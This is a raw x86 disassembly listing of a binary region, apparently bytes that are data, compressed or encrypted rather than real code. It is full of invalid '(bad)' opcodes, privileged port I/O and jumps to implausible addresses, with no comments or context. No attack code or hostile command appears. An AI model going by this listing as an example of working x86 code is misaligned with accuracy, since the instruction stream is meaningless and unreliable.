  418ecf:	sbb    al,0x77
  418ed1:	mov    eax,0x93955fa5
  418ed6:	inc    esi
  418ed7:	cdq    
  418ed8:	pop    es
  418ed9:	xlat   BYTE PTR ds:[ebx]
  418eda:	in     eax,dx
  418edb:	pusha  
  418edc:	ins    BYTE PTR es:[edi],dx
  418edd:	jns    0x418f0c
  418edf:	xchg   esi,eax
  418ee0:	stos   BYTE PTR es:[edi],al
  418ee1:	mov    ebp,esi
  418ee3:	int    0xc3
  418ee5:	cmp    DWORD PTR [ecx-0x7],eax
  418ee8:	push   ebp
  418ee9:	xchg   ebx,eax
  418eea:	inc    esi
  418eeb:	jmp    0x8e7a65b5
  418ef0:	adc    al,0x65
  418ef2:	push   es
  418ef3:	pop    esi
  418ef4:	cmc    
  418ef5:	mov    ecx,0x80ee1560
  418efa:	and    BYTE PTR [ecx],bl
  418efc:	ror    ah,1
  418efe:	pop    ecx
  418eff:	fstp   TBYTE PTR [edx-0x21ec79c7]
  418f05:	cwde   
  418f06:	ret    0x9ac4
  418f09:	gs in  al,dx
  418f0b:	ins    DWORD PTR es:[edi],dx
  418f0c:	push   ss
  418f0d:	addr16 ret 0xf78c
  418f11:	out    0xbc,al
  418f13:	(bad)  
  418f14:	mov    DWORD PTR [ebp-0x7e32c06],esp
  418f1a:	popf   
  418f1b:	hlt    
  418f1c:	aam    0xf7
  418f1e:	sahf   
  418f1f:	pop    esi
  418f20:	dec    ecx
  418f21:	pop    ss
  418f22:	fcomp  QWORD PTR [ecx]
  418f24:	rcr    DWORD PTR [edi+0x53],cl
  418f27:	mov    WORD PTR [ebp+0x44],ss
  418f2a:	xchg   esi,eax
  418f2b:	das    
  418f2c:	xor    esp,esi
  418f2e:	sub    al,0x56
  418f30:	push   ss
  418f31:	pop    edi
  418f32:	out    0x1e,eax
  418f34:	inc    esi
  418f35:	into   
  418f36:	aaa    
  418f37:	mov    edx,0xb015bdea
  418f3c:	sub    dl,BYTE PTR [eax-0x231ecb06]
  418f42:	stos   BYTE PTR es:[edi],al
  418f43:	loopne 0x418efb
  418f45:	imul   eax,DWORD PTR [eax],0x63
  418f48:	(bad)  
  418f49:	ror    DWORD PTR [esi+0x55027035],1
  418f4f:	cmp    bh,BYTE PTR ds:0x4a242a28
  418f55:	sahf   
  418f56:	xor    BYTE PTR [ecx-0x601deb08],dh
  418f5c:	(bad)  
  418f5d:	aas    
  418f5e:	sub    al,0xe0
  418f60:	out    dx,eax
  418f61:	aas    
  418f62:	test   BYTE PTR [ebp-0x4e],cl
  418f65:	in     eax,dx
  418f66:	or     ah,ah
  418f68:	dec    edi
  418f69:	push   edx
  418f6a:	mov    esp,DWORD PTR [ecx+0x15]
  418f6d:	mov    al,0x89
  418f6f:	xchg   ecx,eax
  418f70:	int    0x36
  418f72:	xchg   esi,eax
  418f73:	mov    ebp,0xd8815271
  418f78:	scas   al,BYTE PTR es:[edi]
  418f79:	adc    BYTE PTR [esi],cl
  418f7b:	jl     0x418fce
  418f7d:	outs   dx,DWORD PTR ds:[esi]
  418f7e:	cs aas 
  418f80:	xchg   edx,eax
  418f81:	popf   
  418f82:	push   DWORD PTR [eax-0x476c84c5]
  418f88:	push   0x5d9103da
  418f8d:	mov    al,ds:0x3bb910
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x59eaf1a7]
  419001:	mov    bh,0xf4
  419003:	imul   dl
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0x47000001,al
  41900d:	jns    0x418ff6
  41900f:	ds or  al,0x1
  419012:	call   FWORD PTR [eax+eax*8-0x7fe37876]
  419019:	add    BYTE PTR [ebx],0xd
  41901c:	dec    eax
  41901d:	adc    eax,0x3ee3e6a9
  419022:	jl     0x419054
  419024:	std    
  419025:	in     al,0xb0
  419027:	(bad)  
  419029:	and    BYTE PTR [edx],0x5c
  41902c:	or     al,0xd4
  41902e:	fnstsw WORD PTR [ecx+ebx*1+0x1a152b3c]
  419035:	mov    dl,0x61
  419037:	daa    
  419038:	jo     0x41907e
  41903a:	mov    cl,0xb7
  41903c:	bound  eax,QWORD PTR ds:0xecfe0cc5
  419042:	push   edi
  419043:	push   edx
  419044:	idiv   DWORD PTR ds:0xa2fbe3e2
  41904a:	push   cs
  41904b:	not    BYTE PTR [edi+0x40fcbc42]
  419051:	sub    eax,0x6b81ce3e
  419056:	sbb    esp,edi
  419058:	add    BYTE PTR ds:0x7cd72c61,ch
  41905e:	std    
  41905f:	and    ebp,DWORD PTR [edi-0x69c7ec54]
  419065:	xchg   DWORD PTR [ebp-0xa5d13f5],eax
  41906b:	push   cs
  41906c:	ins    DWORD PTR es:[edi],dx
  41906d:	push   ds
  41906e:	pop    ebx
  41906f:	(bad)  
  419071:	retf   
  419072:	sub    DWORD PTR [ebx-0x72],edx
  419075:	or     DWORD PTR [esi+0x21],ecx
  419078:	ja     0x419067
  41907a:	cmp    DWORD PTR [esi],esi
  41907c:	push   eax
  41907d:	outs   dx,DWORD PTR ds:[esi]
  41907e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41907f:	jmp    0x419086
  419081:	inc    ebx
  419082:	call   0x296e:0xff950889
  419089:	ss in  eax,dx
  41908b:	outs   dx,DWORD PTR ds:[esi]
  41908c:	test   BYTE PTR [ecx],dl
  41908e:	shr    BYTE PTR [eax],1
  419090:	clc    
  419091:	mov    eax,ds:0x8181b964
  419096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419097:	fcomp  DWORD PTR [ecx-0x2fb82436]
  41909d:	mov    edi,0x6fd4654
  4190a2:	(bad)  
  4190a3:	xchg   edi,eax
  4190a4:	pop    ecx
  4190a5:	and    cl,0x3f
  4190a8:	test   dh,bh
  4190aa:	dec    edi
  4190ab:	mov    bh,0x45
  4190ad:	pop    ebp
  4190ae:	add    ecx,DWORD PTR [ebx-0x7d2e21a3]
  4190b4:	loopne 0x419072
  4190b6:	xor    al,0xb
  4190b8:	jp     0x419117
  4190ba:	in     eax,0xf2
  4190bc:	jle    0x419127
  4190be:	cmp    BYTE PTR [ebp-0x61c8df9d],dh
  4190c4:	in     al,dx
  4190c5:	mov    DWORD PTR [edi],esp
  4190c7:	and    al,0x3b
  4190c9:	mov    bl,0x23
  4190cb:	fs in  eax,0x97
  4190ce:	bnd jo 0x419055
  4190d1:	xor    edi,edi
  4190d3:	outs   dx,BYTE PTR ds:[esi]
  4190d4:	imul   ebx,DWORD PTR [esi*2+0x29193a],0xeacafe45
  4190df:	mov    ?,WORD PTR [edi+0x1]
  4190e2:	sbb    edx,edx
  4190e4:	mov    ecx,0xee627402
  4190e9:	lahf   
  4190ea:	mov    esi,0x97f96117
  4190ef:	shr    ecx,0xd4
  4190f2:	fisttp QWORD PTR [ebp-0x3c]
  4190f5:	pop    esp
  4190f6:	ins    BYTE PTR es:[edi],dx
  4190f7:	xor    al,0x33
  4190f9:	mov    esp,0xb7c919f5
  4190fe:	sbb    WORD PTR [esi+ecx*1-0x76f436f],ax
  419106:	add    BYTE PTR [edx+0x32740225],dh
  41910c:	aam    0x31
  41910e:	pop    ds
  41910f:	sub    BYTE PTR [ebp+0x0],0x0
	...
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,BYTE PTR [eax+0x7b]
  419182:	jge    0x41918d
  419184:	out    dx,eax
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x4c000001,al
  41918d:	loope  0x41914f
  41918f:	add    eax,0x26ba08f
  419194:	add    DWORD PTR [edi],ebx
  419196:	inc    eax
  419197:	sub    ebp,DWORD PTR [esi]
  419199:	iret   
  41919a:	jl     0x419127
  41919c:	popa   
  41919d:	xchg   ebp,eax
  41919e:	adc    dh,BYTE PTR [ebx-0x3e]
  4191a1:	retf   
  4191a2:	mov    ebp,0x34c6f6d2
  4191a7:	aam    0xdb
  4191a9:	leave  
  4191aa:	mov    eax,0x8531c0cf
  4191af:	(bad)  
  4191b0:	push   edi
  4191b1:	sub    bh,BYTE PTR [esp+ebx*8-0x3d06a8ed]
  4191b8:	xor    al,BYTE PTR [ecx-0xfb01e1e]
  4191be:	jbe    0x4191d2
  4191c0:	out    dx,al
  4191c1:	jle    0x419239
  4191c3:	(bad)  
  4191c4:	or     eax,0x79953ad4
  4191c9:	dec    edi
  4191ca:	pop    esp
  4191cb:	sti    
  4191cc:	test   al,0x7f
  4191ce:	sbb    DWORD PTR [ecx+0x7957af45],ebp
  4191d4:	xor    BYTE PTR [eax-0x41],al
  4191d7:	cmp    eax,0xc5e952d5
  4191dc:	adc    dh,BYTE PTR ds:0x7cbed52
  4191e2:	push   ecx
  4191e3:	lods   al,BYTE PTR ds:[esi]
  4191e4:	dec    esi
  4191e5:	hlt    
  4191e6:	mov    edi,0x8b31e7bb
  4191eb:	in     eax,0x67
  4191ed:	in     eax,0xb7
  4191ef:	pop    esp
  4191f0:	mov    esi,0x17dba461
  4191f5:	in     al,dx
  4191f6:	xor    DWORD PTR [ebx-0x21],edx
  4191f9:	sar    DWORD PTR [ebp+0x605cf33f],0xd7
  419200:	jle    0x4191e7
  419202:	fidivr DWORD PTR [ebx-0x5d]
  419205:	adc    esi,DWORD PTR [ebp-0x71bfa0e]
  41920b:	jnp    0x419264
  41920d:	enter  0x22f2,0x9c
  419211:	sbb    eax,DWORD PTR [ecx+0x54]
  419214:	retf   
  419215:	push   ebp
  419216:	out    0x85,eax
  419218:	cmp    dl,BYTE PTR [edi+ebp*8+0x561a65dd]
  41921f:	jno    0x4191e1
  419221:	jns    0x4191cb
  419223:	sbb    dh,ah
  419225:	adc    al,0xee
  419227:	(bad)  
  419228:	mov    eax,0xcfe59e75
  41922d:	jg     0x41929c
  41922f:	popf   
  419230:	(bad)  
  419231:	inc    edx
  419232:	mov    dl,0x80
  419234:	clc    
  419235:	dec    esp
  419236:	jae    0x41923a
  419238:	cmp    eax,0x88a3a56d
  41923d:	and    eax,DWORD PTR [edi+eax*8]
  419240:	out    0x1a,eax
  419242:	sbb    al,0xcd
  419244:	retf   0x373b
  419247:	aaa    
  419248:	jbe    0x41921d
  41924a:	clc    
  41924b:	test   al,0xcc
  41924d:	xchg   BYTE PTR [ecx+eiz*8],dh
  419250:	cmp    ch,cl
  419252:	aaa    
  419253:	dec    BYTE PTR [esi]
  419255:	inc    esi
  419256:	mov    ah,0x88
  419258:	xchg   BYTE PTR [ecx-0x5bb23a3d],ch
  41925e:	ret    
  41925f:	daa    
  419260:	dec    ecx
  419261:	mov    eax,ds:0x57749cf1
  419266:	imul   esp,DWORD PTR fs:[edi+0x46],0xffffffe1
  41926b:	(bad)  
  41926c:	mov    eax,0xfd05f820
  419271:	ss out dx,al
  419273:	sbb    eax,0xc031b022
  419278:	ins    DWORD PTR es:[edi],dx
  419279:	pop    ebx
  41927a:	hlt    
  41927b:	dec    esp
  41927c:	jae    0x4192ce
  41927e:	int    0xec
  419280:	xlat   BYTE PTR ds:[ebx]
  419281:	xchg   ebp,eax
  419282:	pop    eax
  419283:	sub    al,0x79
  419285:	push   esi
  419286:	imul   edx,DWORD PTR [esi-0x3b],0x545c4751
  41928d:	xor    cl,BYTE PTR [esi*2+0x6d]
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	pop    esp
  419301:	daa    
  419302:	mov    esp,0x10af48f
  419307:	add    BYTE PTR ds:0xbf000001,al
  41930d:	fcomp  DWORD PTR [esi+0x7c]
  419310:	jle    0x41938c
  419312:	(bad)  
  419314:	lods   eax,DWORD PTR ds:[esi]
  419315:	(bad)  
  419316:	xchg   esi,eax
  419317:	mov    esi,0x469f48e3
  41931c:	jl     0x41933b
  41931e:	or     eax,0x2bbd163
  419323:	ss inc edi
  419325:	or     DWORD PTR [ebp-0x50],edx
  419328:	pop    ss
  419329:	shl    esp,1
  41932b:	call   0x39a9d844
  419330:	xchg   ecx,eax
  419331:	add    al,0xc7
  419333:	aam    0x8
  419335:	adc    bh,BYTE PTR [ecx+0xe]
  419338:	ret    
  419339:	psubsb mm5,QWORD PTR [ebx]
  41933c:	add    dl,cl
  41933e:	mov    esi,0x848558c6
  419343:	scas   al,BYTE PTR es:[edi]
  419344:	add    ah,dh
  419346:	jl     0x419360
  419348:	pop    ebx
  419349:	lea    eax,[ebp+0x3178e23]
  41934f:	daa    
  419350:	jbe    0x419362
  419352:	sbb    esp,esi
  419354:	std    
  419355:	fwait
  419356:	shr    BYTE PTR [ecx-0x5d],1
  419359:	in     eax,dx
  41935a:	cwde   
  41935b:	jns    0x41936a
  41935d:	popa   
  41935e:	pusha  
  41935f:	and    bh,BYTE PTR ds:0xed8b9000
  419365:	dec    ebp
  419366:	shr    DWORD PTR [esi-0x2],1
  419369:	and    BYTE PTR [edi],dl
  41936b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936c:	mov    eax,ds:0xb3d7bd2
  419371:	ds mov dh,0x36
  419374:	ins    DWORD PTR es:[edi],dx
  419375:	jg     0x4193f3
  419377:	fistp  WORD PTR [edi-0x26714b]
  41937d:	imul   esi
  41937f:	adc    edi,edx
  419381:	mov    eax,ds:0xa61cd851
  419386:	mov    edx,fs
  419388:	push   es
  419389:	outs   dx,DWORD PTR ds:[esi]
  41938a:	cld    
  41938b:	jno    0x419326
  41938d:	push   0xfffffff2
  41938f:	add    ah,dh
  419391:	jecxz  0x41935d
  419393:	imul   ebx,DWORD PTR [edx+0x35],0xfffffff5
  419397:	inc    edi
  419398:	loopne 0x419381
  41939a:	inc    edi
  41939b:	or     DWORD PTR [edi+0x6e1a5097],edi
  4193a1:	ins    BYTE PTR es:[edi],dx
  4193a2:	cmp    ah,al
  4193a4:	call   0xb76f9d1b
  4193a9:	and    al,BYTE PTR [ebx-0x74]
  4193ac:	imul   esi,DWORD PTR [eax-0x41],0x8bbd71b6
  4193b3:	loopne 0x4193b7
  4193b5:	inc    ecx
  4193b6:	mov    eax,DWORD PTR [eax-0x48]
  4193b9:	(bad)  
  4193ba:	mov    cl,0x68
  4193bc:	adc    esp,DWORD PTR [edx]
  4193be:	push   ebp
  4193bf:	jmp    0x2605028d
  4193c4:	icebp  
  4193c5:	test   al,0x58
  4193c7:	mov    edx,0x471591d3
  4193cc:	cmp    DWORD PTR [ebx-0x13c0ed36],eax
  4193d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d3:	jmp    0xd9750527
  4193d8:	and    al,0x42
  4193da:	dec    edx
  4193db:	jb     0x4193b6
  4193dd:	fwait
  4193de:	pop    es
  4193df:	or     DWORD PTR [ecx],ecx
  4193e1:	dec    eax
  4193e2:	loope  0x41937d
  4193e4:	xor    esi,ebp
  4193e6:	xchg   ecx,eax
  4193e7:	into   
  4193e8:	inc    ecx
  4193e9:	es mov ch,0x53
  4193ec:	les    edi,FWORD PTR [edx+edi*4]
  4193ef:	xor    al,BYTE PTR [ebx+0x2a]
  4193f2:	mov    ebx,0xca7afae6
  4193f7:	fst    QWORD PTR [eax]
  4193f9:	scas   eax,DWORD PTR es:[edi]
  4193fa:	mov    ds:0x85ff988e,al
  4193ff:	sbb    al,0x76
  419401:	test   DWORD PTR [ecx+0x79],0x593610f7
  419408:	cld    
  419409:	xor    dh,BYTE PTR [edi-0x132d1e07]
  41940f:	and    eax,0x46
	...
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	sahf   
  419481:	push   cs
  419482:	and    edx,DWORD PTR [edx+0x10bf9]
  419488:	add    eax,0x7f000001
  41948d:	mov    ebp,0xca484f84
  419492:	loope  0x419464
  419494:	inc    BYTE PTR [edx]
  419496:	repz into 
  419498:	das    
  419499:	adc    ebp,edx
  41949b:	or     dl,BYTE PTR [eax+eax*8]
  41949e:	mov    WORD PTR [ecx-0x1de23f96],gs
  4194a4:	mov    cl,0xc
  4194a6:	mov    al,ds:0x835cce33
  4194ab:	add    DWORD PTR [edx-0x3c9500c2],0x13
  4194b2:	adc    al,0xce
  4194b4:	imul   eax,ebx,0x9181bd50
  4194ba:	cdq    
  4194bb:	mov    ebx,DWORD PTR [esi+0x64]
  4194be:	fwait
  4194bf:	popa   
  4194c0:	repz mov esp,0x91d988ed
  4194c6:	iret   
  4194c7:	and    al,0x6b
  4194c9:	fwait
  4194ca:	pushf  
  4194cb:	test   DWORD PTR [esp+edi*8+0x2d],ebp
  4194cf:	cmp    BYTE PTR [edx+0x11],ch
  4194d2:	fcom   QWORD PTR [edx+0x3b33c804]
  4194d8:	sbb    eax,0x6870cf1e
  4194dd:	xchg   esp,eax
  4194de:	out    dx,al
  4194df:	cmp    DWORD PTR [ebx+0x2a],edi
  4194e2:	test   bh,0x95
  4194e5:	add    BYTE PTR fs:[ebx-0x5aad15f],0xf2
  4194ed:	in     eax,dx
  4194ee:	dec    eax
  4194ef:	(bad)  
  4194f0:	add    eax,0xd24683c1
  4194f5:	mov    bh,0x3f
  4194f7:	mov    al,ds:0xffd8941e
  4194fc:	out    0x3a,al
  4194fe:	mov    ah,0x94
  419500:	sbb    esp,esi
  419502:	or     al,0x56
  419504:	jp     0x419508
  419506:	test   al,0xa4
  419508:	int3   
  419509:	and    DWORD PTR [edi],ecx
  41950b:	jne    0x4194c8
  41950d:	xchg   esi,eax
  41950e:	sub    BYTE PTR [ecx+esi*1+0x6c9c25a1],ch
  419515:	(bad)  
  419516:	xor    ebx,edx
  419518:	es out 0xd5,al
  41951b:	inc    edx
  41951c:	fld    DWORD PTR gs:[eax+eax*2]
  419520:	push   ebp
  419521:	das    
  419522:	ret    
  419523:	sbb    eax,0xff53fb8f
  419528:	mov    BYTE PTR [ecx],bl
  41952a:	pop    eax
  41952b:	xor    ecx,DWORD PTR [eax+ebp*8+0x49]
  41952f:	cmp    ch,dl
  419531:	xor    edi,DWORD PTR [edx-0x15]
  419534:	cmp    eax,DWORD PTR [ebp-0x2e9946da]
  41953a:	popa   
  41953b:	xor    dl,BYTE PTR [edx+0x3e]
  41953e:	jns    0x419579
  419540:	pop    ds
  419541:	inc    ecx
  419542:	mov    ah,0xf7
  419544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419545:	dec    ebp
  419546:	push   ss
  419547:	mul    DWORD PTR [edx-0x27]
  41954a:	xor    esi,DWORD PTR [ebx]
  41954c:	inc    edx
  41954d:	push   edx
  41954e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41954f:	clc    
  419550:	pop    eax
  419551:	call   DWORD PTR [edi+ebx*1-0x41]
  419555:	push   edi
  419556:	and    ecx,DWORD PTR [eax+edx*2]
  419559:	adc    al,0x9
  41955b:	cmp    eax,0x4db8914e
  419560:	retf   0x5a35
  419563:	inc    ebp
  419564:	ss mov edi,0x6d58a3eb
  41956a:	xchg   DWORD PTR [esi+ecx*2],ebp
  41956d:	rol    BYTE PTR [eax+0x5f61e91e],cl
  419573:	or     BYTE PTR [esi],cl
  419575:	and    eax,0x404fc9cc
  41957a:	(bad)  
  41957c:	adc    ah,ah
  41957e:	add    al,0x1d
  419580:	leave  
  419581:	jb     0x419531
  419583:	outs   dx,BYTE PTR ds:[esi]
  419584:	and    BYTE PTR gs:[esi-0x74],dl
  419588:	jle    0x4195da
  41958a:	shl    BYTE PTR [eax-0x6],1
  41958d:	pop    ss
  41958e:	pop    ds
  41958f:	pop    ecx
  419590:	outs   dx,BYTE PTR ds:[esi]
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	aaa    
  419601:	xor    ch,BYTE PTR ds:0x10cfe95
  419607:	add    BYTE PTR ds:0x6000001,al
  41960d:	ss test ebp,edi
  419610:	mov    al,ds:0x689c6ca3
  419615:	sbb    BYTE PTR [edi],bh
  419617:	(bad)  
  419618:	shl    edi,1
  41961a:	cmp    esp,ebx
  41961c:	call   0xcf3a:0x952b0b40
  419623:	test   eax,0x9df4d94b
  419628:	std    
  419629:	mov    al,0x6
  41962b:	push   eax
  41962c:	inc    ebx
  41962d:	mov    dh,BYTE PTR [edi-0x3248fdf0]
  419633:	inc    ebx
  419634:	fldz   
  419636:	jl     0x419637
  419638:	int    0xf1
  41963a:	jae    0x41962b
  41963c:	(bad)  
  41963d:	xchg   edi,eax
  41963e:	jecxz  0x419691
  419640:	sar    DWORD PTR [eax],cl
  419642:	das    
  419643:	cmp    eax,0x7680dc4
  419648:	stos   DWORD PTR es:[edi],eax
  419649:	or     bh,BYTE PTR [ebp+0x71]
  41964c:	(bad)  
  41964d:	mov    eax,ds:0x10f5034e
  419652:	call   0x3e8f:0x6083ac8b
  419659:	jne    0x4196c5
  41965b:	push   ebx
  41965c:	cmp    ebx,DWORD PTR [edi-0x294d9f7f]
  419662:	mov    edi,0xd8249016
  419667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419668:	xchg   ebx,eax
  419669:	jae    0x41969d
  41966b:	fsub   DWORD PTR [ebp+0x20]
  41966e:	pop    es
  41966f:	dec    ecx
  419670:	push   es
  419671:	in     al,dx
  419672:	dec    ebx
  419673:	test   al,0x34
  419675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419676:	add    DWORD PTR [edi+0x50],ecx
  419679:	js     0x419634
  41967b:	mov    DWORD PTR [ecx],esp
  41967d:	cdq    
  41967e:	inc    edi
  41967f:	xor    al,0xf5
  419681:	retf   0xdb37
  419684:	sub    DWORD PTR [esi+eax*1-0x4f],edx
  419688:	mov    ecx,0xbf97a686
  41968d:	jb     0x41963f
  41968f:	call   0x8323:0x797440bb
  419696:	scas   al,BYTE PTR es:[edi]
  419697:	adc    dl,dh
  419699:	(bad)  
  41969a:	aam    0xc4
  41969c:	sub    eax,0x9a1c4066
  4196a1:	add    al,0x80
  4196a3:	ins    DWORD PTR es:[edi],dx
  4196a4:	shl    DWORD PTR [edx-0x4],cl
  4196a7:	test   BYTE PTR [ebx],ah
  4196a9:	sbb    ebx,eax
  4196ab:	scas   al,BYTE PTR es:[edi]
  4196ac:	push   ds
  4196ad:	arpl   WORD PTR [ebx-0x73],dx
  4196b0:	mov    esp,0x6b44e394
  4196b5:	bound  ecx,QWORD PTR [eax-0x12]
  4196b8:	sub    eax,0x6a111319
  4196bd:	push   ds
  4196be:	adc    esp,ecx
  4196c0:	jl     0x419666
  4196c2:	or     dl,0xe
  4196c5:	dec    ebp
  4196c6:	les    ebp,FWORD PTR [edx]
  4196c8:	lods   al,BYTE PTR ds:[esi]
  4196c9:	popf   
  4196ca:	dec    ebx
  4196cb:	hlt    
  4196cc:	sbb    DWORD PTR [eax-0x1377cf85],esp
  4196d2:	inc    ecx
  4196d3:	(bad)  
  4196d4:	test   eax,0x1000f0de
  4196d9:	cmc    
  4196da:	out    dx,al
  4196db:	(bad)  
  4196dc:	cmp    dh,bh
  4196de:	cwde   
  4196df:	shl    bh,cl
  4196e1:	pop    ebx
  4196e2:	cmc    
  4196e3:	cmp    eax,eax
  4196e5:	mov    ds:0x3d67d1d2,eax
  4196ea:	push   ebp
  4196eb:	shl    BYTE PTR [esi],0xb6
  4196ee:	repnz call 0x9f72:0x4cf8e802
  4196f6:	mov    cl,0xdc
  4196f8:	adc    DWORD PTR [edx-0x7215c0dd],ebp
  4196fe:	repz and esi,DWORD PTR [edi]
  419701:	pushf  
  419702:	ins    DWORD PTR es:[edi],dx
  419703:	ds aam 0xd2
  419706:	fs sub eax,0x8446d75f
  41970c:	xor    BYTE PTR [esi-0x1c],ah
  41970f:	fst    QWORD PTR [esi+0x0]
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xc8dd0ae
  419781:	adc    eax,0xe03a1ed
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x2b000001
  41978d:	jbe    0x41976c
  41978f:	sbb    bh,BYTE PTR [ebp-0x50]
  419792:	pop    esi
  419793:	jle    0x4197f4
  419795:	ss mov edx,0xd5d77096
  41979b:	add    dh,0x3e
  41979e:	sti    
  41979f:	mov    ds:0x8c39cf2f,eax
  4197a4:	(bad)  
  4197a5:	lock retf 
  4197a7:	sbb    eax,0x399fe82c
  4197ac:	pop    ecx
  4197ad:	aam    0x8
  4197af:	retf   
  4197b0:	je     0x41979a
  4197b2:	mov    ?,WORD PTR [edi+0x6fd00576]
  4197b8:	cmp    eax,0x1fc40911
  4197bd:	rcl    BYTE PTR [edx-0x63],0x25
  4197c1:	das    
  4197c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c3:	aaa    
  4197c4:	mov    esi,0xf1b6378e
  4197c9:	gs idiv edi
  4197cc:	mov    cl,0x21
  4197ce:	and    DWORD PTR [ecx],ebx
  4197d0:	lahf   
  4197d1:	fld    st(3)
  4197d3:	push   eax
  4197d4:	xor    ah,BYTE PTR [edx+0x9df0f8f]
  4197da:	add    DWORD PTR [ebx-0x4a],0xffffffb0
  4197de:	imul   edx,DWORD PTR [ebx-0xa01e95e],0xffffffa5
  4197e5:	mov    esp,0xc8bddea1
  4197ea:	in     al,0x25
  4197ec:	push   ebx
  4197ed:	push   0x5577de33
  4197f2:	jmp    0x4fa:0x8966c684
  4197f9:	test   BYTE PTR [ebp-0xd],dl
  4197fc:	loope  0x4197ff
  4197fe:	pop    edx
  4197ff:	les    eax,FWORD PTR [edx-0x26]
  419802:	and    al,0xa2
  419804:	ret    
  419805:	sub    al,0xb7
  419807:	call   0xfb8db4c6
  41980c:	in     eax,0x78
  41980e:	repnz lahf 
  419810:	test   al,0x94
  419812:	das    
  419813:	and    ah,BYTE PTR [ebx-0x71]
  419816:	inc    esp
  419817:	sub    ebx,esp
  419819:	test   al,0xe4
  41981b:	dec    esi
  41981c:	add    eax,0x49f13bdf
  419821:	adc    edx,DWORD PTR [ebx+0x542d3b9]
  419827:	push   esi
  419828:	pop    es
  419829:	mov    ebx,0xa92fa6ba
  41982e:	push   ss
  41982f:	out    0x4c,al
  419831:	pop    edx
  419832:	imul   esp,DWORD PTR ss:[ebx-0x1f8cb1bc],0x60827cb8
  41983d:	xchg   edi,eax
  41983e:	pushf  
  41983f:	mov    edi,0x22b4b8e2
  419844:	in     al,dx
  419845:	daa    
  419846:	or     al,BYTE PTR [ecx+0x51a6d95]
  41984c:	pop    ebx
  41984d:	push   0xffffff86
  41984f:	adc    al,0xfc
  419851:	jo     0x4197ee
  419853:	(bad)  [ebp+0x63]
  419856:	outs   dx,BYTE PTR ds:[esi]
  419857:	jmp    0x85cd:0x4ebd1afc
  41985e:	shr    BYTE PTR ds:0x77277e55,0xbb
  419865:	dec    ebx
  419866:	retf   
  419867:	out    0x70,eax
  419869:	out    0x80,al
  41986b:	sub    eax,0x32fea843
  419870:	repz and BYTE PTR [ebp-0x5a],cl
  419874:	push   eax
  419875:	pop    ecx
  419876:	(bad)  
  419877:	addr16 xchg ebp,eax
  419879:	test   BYTE PTR [ebx+0x59],bl
  41987c:	mov    DWORD PTR [ebx+0x66],esi
  41987f:	ins    DWORD PTR es:[edi],dx
  419880:	(bad)  
  419881:	int3   
  419882:	and    bh,bl
  419884:	and    DWORD PTR [ebp+edx*1-0x5ebd3aae],esi
  41988b:	mov    al,ds:0x61f8e941
  419890:	inc    ebx
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	frstor [ebx+eax*4+0xf08ba70]
  419906:	add    DWORD PTR [eax],eax
  419908:	add    eax,0x6c000001
  41990d:	fabs   
  41990f:	lods   al,BYTE PTR ds:[esi]
  419910:	pop    ds
  419911:	xchg   esi,eax
  419912:	ins    DWORD PTR es:[edi],dx
  419913:	hlt    
  419914:	dec    ebp
  419915:	lahf   
  419916:	sbb    esp,DWORD PTR [edx-0x60b78c2]
  41991c:	repz mov edx,0xec1b0a60
  419922:	xchg   ecx,eax
  419923:	aam    0x57
  419925:	sbb    DWORD PTR [ecx+0x41],0xffffffff
  419929:	jb     0x41991b
  41992b:	mov    ebx,0xac949d3e
  419930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419931:	les    ecx,FWORD PTR es:[esi]
  419934:	clc    
  419935:	or     DWORD PTR [edi],edi
  419937:	or     cl,al
  419939:	xchg   esi,eax
  41993a:	cdq    
  41993b:	ds icebp 
  41993d:	nop
  41993e:	or     eax,0x73f1884
  419943:	or     BYTE PTR [ebx],0x56
  419946:	pushf  
  419947:	fist   DWORD PTR [esi]
  419949:	dec    eax
  41994a:	push   ebp
  41994b:	test   DWORD PTR [edx-0x3c],eax
  41994e:	sub    ah,BYTE PTR [esp+edi*4]
  419951:	xor    edx,esi
  419953:	adc    eax,0xffffffaf
  419956:	dec    edi
  419957:	fwait
  419958:	and    esp,DWORD PTR [esi]
  41995a:	or     eax,0x288c2e49
  41995f:	loopne 0x419986
  419961:	js     0x419913
  419963:	aaa    
  419964:	ror    DWORD PTR [ebx-0x1c],0x4c
  419968:	sbb    eax,0x8bed6e51
  41996d:	nop
  41996e:	int    0xf1
